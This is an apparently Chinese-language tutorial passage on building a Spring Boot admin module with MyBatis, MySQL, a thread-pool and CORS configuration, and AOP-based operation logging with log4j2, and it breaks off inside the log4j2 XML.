\u0026lt;!--\u0026lt;/dependency\u0026gt;--\u0026gt; \u0026lt;!--常用工具类 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.commons\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-lang3\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- JSON工具类 --\u0026gt; \u0026lt;!--\u0026lt;dependency\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;groupId\u0026gt;com.fasterxml.jackson.core\u0026lt;/groupId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;artifactId\u0026gt;jackson-databind\u0026lt;/artifactId\u0026gt;--\u0026gt; \u0026lt;!--\u0026lt;/dependency\u0026gt;--\u0026gt; \u0026lt;!-- 阿里JSON解析器 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba.fastjson2\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson2\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- io常用工具类 --\u0026gt; \u0026lt;!--\u0026lt;dependency\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;groupId\u0026gt;commons-io\u0026lt;/groupId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;artifactId\u0026gt;commons-io\u0026lt;/artifactId\u0026gt;--\u0026gt; \u0026lt;!--\u0026lt;/dependency\u0026gt;--\u0026gt; \u0026lt;!-- 文件上传工具类 --\u0026gt; \u0026lt;!--\u0026lt;dependency\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;groupId\u0026gt;commons-fileupload\u0026lt;/groupId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;artifactId\u0026gt;commons-fileupload\u0026lt;/artifactId\u0026gt;--\u0026gt; \u0026lt;!--\u0026lt;/dependency\u0026gt;--\u0026gt; \u0026lt;!-- excel工具 --\u0026gt; \u0026lt;!--\u0026lt;dependency\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;groupId\u0026gt;org.apache.poi\u0026lt;/groupId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;artifactId\u0026gt;poi-ooxml\u0026lt;/artifactId\u0026gt;--\u0026gt; \u0026lt;!--\u0026lt;/dependency\u0026gt;--\u0026gt; \u0026lt;!-- yml解析器 --\u0026gt; \u0026lt;!--\u0026lt;dependency\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;groupId\u0026gt;org.yaml\u0026lt;/groupId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;artifactId\u0026gt;snakeyaml\u0026lt;/artifactId\u0026gt;--\u0026gt; \u0026lt;!--\u0026lt;/dependency\u0026gt;--\u0026gt; \u0026lt;!--Token生成与解析--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;io.jsonwebtoken\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jjwt\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- Jaxb --\u0026gt; \u0026lt;!--\u0026lt;dependency\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;groupId\u0026gt;javax.xml.bind\u0026lt;/groupId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;artifactId\u0026gt;jaxb-api\u0026lt;/artifactId\u0026gt;--\u0026gt; \u0026lt;!--\u0026lt;/dependency\u0026gt;--\u0026gt; \u0026lt;!-- redis 缓存操作 --\u0026gt; \u0026lt;!--\u0026lt;dependency\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;artifactId\u0026gt;spring-boot-starter-data-redis\u0026lt;/artifactId\u0026gt;--\u0026gt; \u0026lt;!--\u0026lt;/dependency\u0026gt;--\u0026gt; \u0026lt;!-- pool 对象池 --\u0026gt; \u0026lt;!--\u0026lt;dependency\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;groupId\u0026gt;org.apache.commons\u0026lt;/groupId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;artifactId\u0026gt;commons-pool2\u0026lt;/artifactId\u0026gt;--\u0026gt; \u0026lt;!--\u0026lt;/dependency\u0026gt;--\u0026gt; \u0026lt;!-- 解析客户端操作系统、浏览器等 --\u0026gt; \u0026lt;!--\u0026lt;dependency\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;groupId\u0026gt;eu.bitwalker\u0026lt;/groupId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;artifactId\u0026gt;UserAgentUtils\u0026lt;/artifactId\u0026gt;--\u0026gt; \u0026lt;!--\u0026lt;/dependency\u0026gt;--\u0026gt; \u0026lt;!-- servlet包 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;javax.servlet\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;javax.servlet-api\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;/project\u0026gt; 初始化admin模块 1. 添加依赖 上一节已添加\n**父项目：**引入pagehelper-spring-boot-starter（后面分页实现使用的分页插件），并规定版本号。\npagehelper-spring-boot-starter内含依赖：(主要是有整合mybatis的驱动mybatis-spring-boot-starter，引入它就可以不用再声明引入mybatis驱动)，如下图：\n1 2 3 4 5 6 \u0026lt;!-- pagehelper 分页插件 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.github.pagehelper\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;pagehelper-spring-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${pagehelper.boot.version}\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; lab-admin\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;!-- pagehelper 分页插件 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.github.pagehelper\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;pagehelper-spring-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!--mysql驱动 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;mysql\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mysql-connector-java\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 2. 准备数据库表 建库：\n建表：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 -- ---------------------------- -- 用户信息表 -- ---------------------------- drop table if exists sys_user; create table sys_user ( user_id bigint(20) not null auto_increment comment \u0026#39;用户ID\u0026#39;, user_name varchar(30) not null comment \u0026#39;用户名\u0026#39;, user_type varchar(2) default \u0026#39;00\u0026#39; comment \u0026#39;用户类型（00系统用户）\u0026#39;, email varchar(50) default \u0026#39;\u0026#39; comment \u0026#39;用户邮箱\u0026#39;, phonenumber varchar(11) default \u0026#39;\u0026#39; comment \u0026#39;手机号码\u0026#39;, sex char(1) default \u0026#39;0\u0026#39; comment \u0026#39;用户性别（0男 1女 2未知）\u0026#39;, avatar varchar(100) default \u0026#39;\u0026#39; comment \u0026#39;头像地址\u0026#39;, password varchar(100) default \u0026#39;\u0026#39; comment \u0026#39;密码\u0026#39;, login_ip varchar(128) default \u0026#39;\u0026#39; comment \u0026#39;最后登录IP\u0026#39;, login_date datetime comment \u0026#39;最后登录时间\u0026#39;, create_by varchar(64) default \u0026#39;\u0026#39; comment \u0026#39;创建者\u0026#39;, create_time datetime comment \u0026#39;创建时间\u0026#39;, update_by varchar(64) default \u0026#39;\u0026#39; comment \u0026#39;更新者\u0026#39;, update_time datetime comment \u0026#39;更新时间\u0026#39;, remark varchar(500) default null comment \u0026#39;备注\u0026#39;, primary key (user_id) ) engine=innodb auto_increment=100 comment = \u0026#39;用户信息表\u0026#39;; insert into sys_user (user_id, user_name, email, phonenumber) values(1, \u0026#39;阿彬\u0026#39;, \u0026#39;7b@163.com\u0026#39;, \u0026#39;15888888888\u0026#39;); 3. 整合mybatis等初始化配置 application.yml配置文件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 # 项目相关配置 lab: # 名称 name: OpenGMS-Lab # 版本 version: 1.0.0 # 版权年份 copyrightYear: 2022 # 文件路径 示例（ Windows配置E:/opengms-lab/uploadPath，Linux配置 /home/opengms-lab/uploadPath） # profile: E:/opengms-lab/uploadPath # 验证码类型 math 数组计算 char 字符验证 captchaType: math # 开发环境配置 server: # 服务器的HTTP端口，默认为8080 port: 8888 spring: profiles: active: dev datasource: name: lab_datasource url: jdbc:mysql://127.0.0.1:3306/opengms_lab?useUnicode=true\u0026amp;characterEncoding=utf8\u0026amp;autoReconnect=true\u0026amp;useSSL=false\u0026amp;serverTimezone=Asia/Shanghai driver-class-name: com.mysql.cj.jdbc.Driver username: root password: 123456 # MyBatis配置 mybatis: # 搜索指定包别名 typeAliasesPackage: org.opengms.**.entity.po # 配置mapper的扫描，找到所有的mapper.xml映射文件 mapperLocations: classpath*:mapper/**/*Mapper.xml # 加载全局的配置文件 configLocation: classpath:mybatis/mybatis-config.xml application-dev.yml配置文件：\n1 2 lab: profile: E:/opengms-lab/uploadPath mybatils配置文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; ?\u0026gt; \u0026lt;!DOCTYPE configuration PUBLIC \u0026#34;-//mybatis.org//DTD Config 3.0//EN\u0026#34; \u0026#34;http://mybatis.org/dtd/mybatis-3-config.dtd\u0026#34;\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;!-- 全局参数 --\u0026gt; \u0026lt;settings\u0026gt; \u0026lt;!-- 使全局的映射器启用或禁用缓存 --\u0026gt; \u0026lt;setting name=\u0026#34;cacheEnabled\u0026#34; value=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;!-- 允许JDBC 支持自动生成主键 --\u0026gt; \u0026lt;setting name=\u0026#34;useGeneratedKeys\u0026#34; value=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;!-- 配置默认的执行器.SIMPLE就是普通执行器;REUSE执行器会重用预处理语句(prepared statements);BATCH执行器将重用语句并执行批量更新 --\u0026gt; \u0026lt;setting name=\u0026#34;defaultExecutorType\u0026#34; value=\u0026#34;SIMPLE\u0026#34; /\u0026gt; \u0026lt;!-- 指定 MyBatis 所用日志的具体实现 --\u0026gt; \u0026lt;setting name=\u0026#34;logImpl\u0026#34; value=\u0026#34;SLF4J\u0026#34; /\u0026gt; \u0026lt;!-- 使用驼峰命名法转换字段 --\u0026gt; \u0026lt;setting name=\u0026#34;mapUnderscoreToCamelCase\u0026#34; value=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;/settings\u0026gt; \u0026lt;/configuration\u0026gt; 1.default-executor-type详解：https://blog.csdn.net/fengshuiyue/article/details/89222654\n2.use-generated-keys详解：https://blog.csdn.net/u012060033/article/details/79948353\n就是\n3.cache-enabled详解：https://blog.csdn.net/canot/article/details/51491732\n缓存暂时没用到，后面整合redis后用redis做缓存。\n4. 创建各层测试 一、User实体类\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 @Data public class User { private static final long serialVersionUID = 1L; /** 用户ID */ private Long userId; /** 用户名 */ private String userName; /** 用户邮箱 */ private String email; /** 手机号码 */ private String phonenumber; } 二、controller层\nUserController\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 @RestController @RequestMapping(\u0026#34;/user\u0026#34;) public class UserController { @Autowired IUserService userService; @GetMapping(value = \u0026#34;/{userId}\u0026#34; ) public User selectUserById(@PathVariable(value = \u0026#34;userId\u0026#34;) Long userId){ // Long userId = 101L; return userService.selectUserById(userId); } } 三、service层\nIUserService\n1 2 3 public interface IUserService { User selectUserById(Long userId); } UserServiceImpl\n1 2 3 4 5 6 7 8 9 10 11 @Service public class UserServiceImpl implements IUserService { @Autowired private UserMapper userMapper; @Override public User selectUserById(Long userId) { return userMapper.selectUserById(userId); } } 四、dao层\nUserMapper\n1 2 3 4 5 6 @Mapper public interface UserMapper { User selectUserById(Long userId); } UserMapper.xml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; ?\u0026gt; \u0026lt;!DOCTYPE mapper PUBLIC \u0026#34;-//mybatis.org//DTD Mapper 3.0//EN\u0026#34; \u0026#34;http://mybatis.org/dtd/mybatis-3-mapper.dtd\u0026#34;\u0026gt; \u0026lt;mapper namespace=\u0026#34;org.opengms.admin.mapper.UserMapper\u0026#34;\u0026gt; \u0026lt;resultMap type=\u0026#34;User\u0026#34; id=\u0026#34;UserResult\u0026#34;\u0026gt; \u0026lt;result property=\u0026#34;userId\u0026#34; column=\u0026#34;user_id\u0026#34; /\u0026gt; \u0026lt;result property=\u0026#34;userName\u0026#34; column=\u0026#34;user_name\u0026#34; /\u0026gt; \u0026lt;result property=\u0026#34;email\u0026#34; column=\u0026#34;email\u0026#34; /\u0026gt; \u0026lt;result property=\u0026#34;phonenumber\u0026#34; column=\u0026#34;phonenumber\u0026#34; /\u0026gt; \u0026lt;/resultMap\u0026gt; \u0026lt;select id=\u0026#34;selectUserById\u0026#34; parameterType=\u0026#34;Long\u0026#34; resultMap=\u0026#34;UserResult\u0026#34;\u0026gt; select user_id, user_name, email, phonenumber from sys_user as u where u.user_id = #{userId} \u0026lt;/select\u0026gt; \u0026lt;/mapper\u0026gt; 5. 启动日志 banner.txt\nhttps://www.bootschool.net/ascii\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 Application Version: ${lab.version} Spring Boot Version: ${spring-boot.version} //////////////////////////////////////////////////////////////////// // _ooOoo_ // // o8888888o // // 88\u0026#34; . \u0026#34;88 // // (| ^_^ |) // // O\\ = /O // // ____/`---\u0026#39;\\____ // // .\u0026#39; \\\\| |// `. // // / \\\\||| : |||// \\ // // / _||||| -:- |||||- \\ // // | | \\\\\\ - /// | | // // | \\_| \u0026#39;\u0026#39;\\---/\u0026#39;\u0026#39; | | // // \\ .-\\__ `-` ___/-. / // // ___`. .\u0026#39; /--.--\\ `. . ___ // // .\u0026#34;\u0026#34; \u0026#39;\u0026lt; `.___\\_\u0026lt;|\u0026gt;_/___.\u0026#39; \u0026gt;\u0026#39;\u0026#34;\u0026#34;. // // | | : `- \\`.;`\\ _ /`;.`/ - ` : | | // // \\ \\ `-. \\_ __\\ /__ _/ .-` / / // // ========`-.____`-.___\\_____/___.-`____.-\u0026#39;======== // // `=---=\u0026#39; // // ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ // // 佛祖保佑 永不宕机 永无BUG // //////////////////////////////////////////////////////////////////// ____ _____ __ __ _____ _ _ / __ \\ / ____| \\/ |/ ____| | | | | | | | |_ __ ___ _ __ | | __| \\ / | (___ | | __ _| |__ | | | | \u0026#39;_ \\ / _ \\ \u0026#39;_ \\| | |_ | |\\/| |\\___ \\ | | / _` | \u0026#39;_ \\ | |__| | |_) | __/ | | | |__| | | | |____) | | |___| (_| | |_) | \\____/| .__/ \\___|_| |_|\\_____|_| |_|_____/ |______\\__,_|_.__/ | | |_| 6. 读取项目相关配置 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 @Component @ConfigurationProperties(prefix = \u0026#34;lab\u0026#34;) public class LabConfig { /** 项目名称 */ private String name; /** 版本 */ private String version; /** 版权年份 */ private String copyrightYear; /** 上传路径 */ private static String profile; /** 验证码类型 */ private static String captchaType; } 7. 直接拷贝lab-common整个模块并在admin中引入 lab-admin的pom文件：\n1 2 3 4 5 6 \u0026lt;!--项目common通用工具类 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.opengms\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;lab-common\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.0.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 线程配置 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 @Configuration @EnableScheduling //同步 @EnableAsync //异步 public class ScheduleConfig { @Bean public TaskExecutor taskExecutor() { ThreadPoolTaskExecutor executor = new ThreadPoolTaskExecutor(); // 设置核心线程数 核心线程数线程数定义了最小可以同时运行的线程数量 executor.setCorePoolSize(3); // 设置最大线程数 当队列中存放的任务达到队列容量的时候，当前可以同时运行的线程数量变为最大线程数 executor.setMaxPoolSize(5); // 设置队列容量 当新任务来的时候会先判断当前运行的线程数量是否达到核心线程数，如果达到的话，信任就会被存放在队列中 executor.setQueueCapacity(200); // 设置线程活跃时间（秒） executor.setKeepAliveSeconds(60); // 设置默认线程名称 executor.setThreadNamePrefix(\u0026#34;AsyncThread-\u0026#34;); // 设置拒绝策略 当最大池被填满时，此策略为我们提供可伸缩队列 executor.setRejectedExecutionHandler(new ThreadPoolExecutor.CallerRunsPolicy()); // 等待所有任务结束后再关闭线程池 executor.setWaitForTasksToCompleteOnShutdown(true); return executor; } } 跨域、登录验证、全局异常配置 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 @Configuration public class WebConfig implements WebMvcConfigurer{ //解决跨域问题 @Override public void addCorsMappings(CorsRegistry registry) { registry.addMapping(\u0026#34;/**\u0026#34;); //允许远端访问的域名 // .allowedOrigins(\u0026#34;http://localhost:8099\u0026#34;) //允许请求的方法(\u0026#34;POST\u0026#34;, \u0026#34;GET\u0026#34;, \u0026#34;PUT\u0026#34;, \u0026#34;OPTIONS\u0026#34;, \u0026#34;DELETE\u0026#34;) // .allowedMethods(\u0026#34;*\u0026#34;) //允许请求头 // .allowedHeaders(\u0026#34;*\u0026#34;); } //登录请求问题 @Override public void addInterceptors(InterceptorRegistry registry) { /** * kn4j 在想文档相关的资源 需要放开 */ String[] swaggerPatterns = { \u0026#34;/swagger-resources/**\u0026#34;, \u0026#34;/webjars/**\u0026#34;, \u0026#34;/v2/**\u0026#34;, \u0026#34;/swagger-ui.html/**\u0026#34;, \u0026#34;/doc.html/**\u0026#34; }; registry.addInterceptor(authenticationInterceptor()) .excludePathPatterns(swaggerPatterns) .addPathPatterns(\u0026#34;/**\u0026#34;); // 拦截所有请求，通过判断是否有 @LoginRequired 注解 决定是否需要登录 } @Bean public AuthenticationInterceptor authenticationInterceptor() { return new AuthenticationInterceptor(); } } 整合日志实现 整体思路：SLF4j+log4j2+Aop\n1. 添加依赖 lab-admin\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;!-- SpringBoot Web容器 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-web\u0026lt;/artifactId\u0026gt; \u0026lt;!--以下是排除的组件--\u0026gt; \u0026lt;exclusions\u0026gt; \u0026lt;!--排除默认自带的log组件--\u0026gt; \u0026lt;exclusion\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-logging\u0026lt;/artifactId\u0026gt; \u0026lt;/exclusion\u0026gt; \u0026lt;/exclusions\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!--log4j2日志相关 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-log4j2\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- SpringBoot 拦截器 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-aop\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 2. 创建数据库表 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 -- ---------------------------- -- 操作日志记录 -- ---------------------------- drop table if exists sys_oper_log; create table sys_oper_log ( oper_id bigint(20) not null auto_increment comment \u0026#39;日志主键\u0026#39;, title varchar(50) default \u0026#39;\u0026#39; comment \u0026#39;模块标题\u0026#39;, business_type int(2) default 0 comment \u0026#39;业务类型（0其它 1新增 2修改 3删除）\u0026#39;, method varchar(100) default \u0026#39;\u0026#39; comment \u0026#39;方法名称\u0026#39;, request_method varchar(10) default \u0026#39;\u0026#39; comment \u0026#39;请求方式\u0026#39;, operator_type int(1) default 0 comment \u0026#39;操作类别（0其它 1后台用户 2手机端用户）\u0026#39;, oper_name varchar(50) default \u0026#39;\u0026#39; comment \u0026#39;操作人员\u0026#39;, oper_url varchar(255) default \u0026#39;\u0026#39; comment \u0026#39;请求URL\u0026#39;, oper_ip varchar(128) default \u0026#39;\u0026#39; comment \u0026#39;主机地址\u0026#39;, oper_location varchar(255) default \u0026#39;\u0026#39; comment \u0026#39;操作地点\u0026#39;, oper_param varchar(2000) default \u0026#39;\u0026#39; comment \u0026#39;请求参数\u0026#39;, json_result varchar(2000) default \u0026#39;\u0026#39; comment \u0026#39;返回参数\u0026#39;, status int(1) default 0 comment \u0026#39;操作状态（0正常 1异常）\u0026#39;, error_msg varchar(2000) default \u0026#39;\u0026#39; comment \u0026#39;错误消息\u0026#39;, oper_time datetime comment \u0026#39;操作时间\u0026#39;, primary key (oper_id) ) engine=innodb auto_increment=100 comment = \u0026#39;操作日志记录\u0026#39;; 3. 自定义注解@Log及相关枚举 一、Log\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 @Target({ ElementType.PARAMETER, ElementType.METHOD }) @Retention(RetentionPolicy.RUNTIME) @Documented public @interface Log { /** * 模块 */ String title() default \u0026#34;\u0026#34;; /** * 功能 */ BusinessType businessType() default BusinessType.OTHER; /** * 操作人类别 */ OperatorType operatorType() default OperatorType.MANAGE; /** * 是否保存请求的参数 */ boolean isSaveRequestData() default true; /** * 是否保存响应的参数 */ boolean isSaveResponseData() default true; } 二、BusinessType\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 public enum BusinessType { /** * 其它 */ OTHER, /** * 新增 */ INSERT, /** * 修改 */ UPDATE, /** * 删除 */ DELETE, /** * 授权 */ GRANT, /** * 导出 */ EXPORT, /** * 导入 */ IMPORT, /** * 强退 */ FORCE, /** * 生成代码 */ GENCODE, /** * 清空数据 */ CLEAN, } 三、OperatorType\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 public enum OperatorType { /** * 其它 */ OTHER, /** * 后台用户 */ MANAGE, /** * 手机端用户 */ MOBILE } 4. AOP切面处理请求操作日志 核心的LogAspect切面处理类中的保存Log具体处理方法handleLog主要逻辑：\n获得注解 从缓存获取当前的用户信息(暂缺，先模拟一个) 获取请求各项需要记录的基本信息 判断请求是否有异常 保存到数据库 打印到控制台 代码片段如下，详细代码见LogAspect\n1 2 3 4 5 6 7 8 9 10 /** * 处理完请求后执行 * * @param joinPoint 切点 */ @AfterReturning(pointcut = \u0026#34;@annotation(controllerLog)\u0026#34;, returning = \u0026#34;jsonResult\u0026#34;) public void doAfterReturning(JoinPoint joinPoint, Log controllerLog, Object jsonResult) { handleLog(joinPoint, controllerLog, null, jsonResult); } 5. aop代理配置 1 2 3 4 5 6 @Configuration // 表示通过aop框架暴露该代理对象,AopContext能够访问 @EnableAspectJAutoProxy(exposeProxy = true) public class ApplicationConfig { } 参考链接：\n注解@EnableAspectJAutoProxy(exposeProxy = true) exposeProxy 的用法\n5. log4j2的配置文件 日志的配置主要用在生产环境中\n参考链接：\nSpringBoot 配置控制台彩色日志输出\n配置文件位置：\napplication.yml\n1 2 3 4 5 #日志配置 logging: level: org.opengms: debug org.springframework: warn application-prod.yml\n1 2 3 4 5 6 7 8 lab: profile: /home/opengms-lab/uploadPath #日志配置 logging: config: classpath:log4j2-config.xml file: path: /home/opengms-lab/logs 参考链接：\nlog4j2 配置文件读取 application.yml 的日志路径变量\nlog4j2-config.xml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!-- 6个优先级从高到低依次为：OFF、FATAL、ERROR、WARN、INFO、DEBUG、TRACE、 ALL。 如果设置优先级为WARN，那么OFF、FATAL、ERROR、WARN 4个级别的log能正常输出 设置为OFF 表示不记录log4j2本身的日志， --\u0026gt; \u0026lt;!-- status：用来指定log4j本身的打印日志级别,monitorInterval:指定log4j自动重新配置的监测间隔时间 --\u0026gt; \u0026lt;Configuration status=\u0026#34;fatal\u0026#34;\u0026gt; \u0026lt;Properties\u0026gt; \u0026lt;!-- 日志输出格式 --\u0026gt; \u0026lt;!--\u0026lt;property name=\u0026#34;LOG_PATTERN\u0026#34; value=\u0026#34;%d{yyyy-MM-dd HH:mm:ss.SSS} %5p ${PID:-} [%15.15t] %-40.40logger{39} : %m%n\u0026#34; /\u0026gt;--\u0026gt; \u0026lt;property name=\u0026#34;LOG_PATTERN\u0026#34; value=\u0026#34;%d{yyyy-MM-dd HH:mm:ss.SSS} %highlight{%5level} %style{%pid}{yellow} --- [%15.15t] %style{%-40.40logger{39}}{blue} : %msg%n%style{%throwable}{red}\u0026#34; /\u0026gt; \u0026lt;!-- ${sys:LOG_PATH} 读取的就是 application.yml 中的 logging.file.path 的值 --\u0026gt; \u0026lt;property name=\u0026#34;baseDir\u0026#34; value=\u0026#34;${sys:LOG_PATH}\u0026#34; /\u0026gt; \u0026lt;/Properties\u0026gt; \u0026lt;Appenders\u0026gt; \u0026lt;Console name=\u0026#34;Console\u0026#34; target=\u0026#34;SYSTEM_OUT\u0026#34;\u0026gt; \u0026lt;!--控制台只输出level及以上级别的信息（onMatch），其他的直接拒绝（onMismatch） --\u0026gt; \u0026lt;ThresholdFilter level=\u0026#34;debug\u0026#34; onMatch=\u0026#34;ACCEPT\u0026#34; onMismatch=\u0026#34;DENY\u0026#34;/\u0026gt; \u0026lt;PatternLayout pattern=\u0026#34;${LOG_PATTERN}\u0026#34; disableAnsi=\u0026#34;false\u0026#34; noConsoleNoAnsi=\u0026#34;false\u0026#34;/\u0026gt; \u0026lt;!--\u0026lt;PatternLayout--\u0026gt; \u0026lt;!-- pattern=\u0026#34;%d{yyyy-MM-dd HH:mm:ss.SSS} %highlight{%5level} %style{%pid}{yellow} -\u0026amp;#45;\u0026amp;#45; [%15.15t] %style{%-40.40logger{39}}{blue} : %msg%n%style{%throwable}{red}\u0026#34;--\u0026gt; \u0026lt;!-- disableAnsi=\u0026#34;false\u0026#34; noConsoleNoAnsi=\u0026#34;false\u0026#34;/\u0026gt;--\u0026gt; \u0026lt;/Console\u0026gt; \u0026lt;!--debug级别日志文件输出--\u0026gt; \u0026lt;!--\u0026lt;RollingFile name=\u0026#34;debug_appender\u0026#34; fileName=\u0026#34;${baseDir}/debug.log\u0026#34;--\u0026gt; \u0026lt;!-- filePattern=\u0026#34;${baseDir}/debug_%i.log.%d{yyyy-MM-dd}\u0026#34;\u0026gt;--\u0026gt; \u0026lt;!-- \u0026amp;lt;!\u0026amp;ndash; 过滤器 \u0026amp;ndash;\u0026amp;gt;--\u0026gt; \u0026lt;!-- \u0026lt;Filters\u0026gt;--\u0026gt; \u0026lt;!-- \u0026amp;lt;!\u0026amp;ndash; 限制日志级别在debug及以上在info以下 \u0026amp;ndash;\u0026amp;gt;--\u0026gt; \u0026lt;!-- \u0026lt;ThresholdFilter level=\u0026#34;debug\u0026#34;/\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;ThresholdFilter level=\u0026#34;info\u0026#34; onMatch=\u0026#34;DENY\u0026#34; onMismatch=\u0026#34;NEUTRAL\u0026#34;/\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;/Filters\u0026gt;--\u0026gt; \u0026lt;!-- \u0026amp;lt;!\u0026amp;ndash; 日志格式 \u0026amp;ndash;\u0026amp;gt;--\u0026gt; \u0026lt;!-- \u0026lt;PatternLayout pattern=\u0026#34;${LOG_PATTERN}\u0026#34;/\u0026gt;--\u0026gt; \u0026lt;!-- \u0026amp;lt;!\u0026amp;ndash; 策略 \u0026amp;ndash;\u0026amp;gt;--\u0026gt; \u0026lt;!-- \u0026lt;Policies\u0026gt;--\u0026gt; \u0026lt;!-- \u0026amp;lt;!\u0026amp;ndash; 每隔一天转存 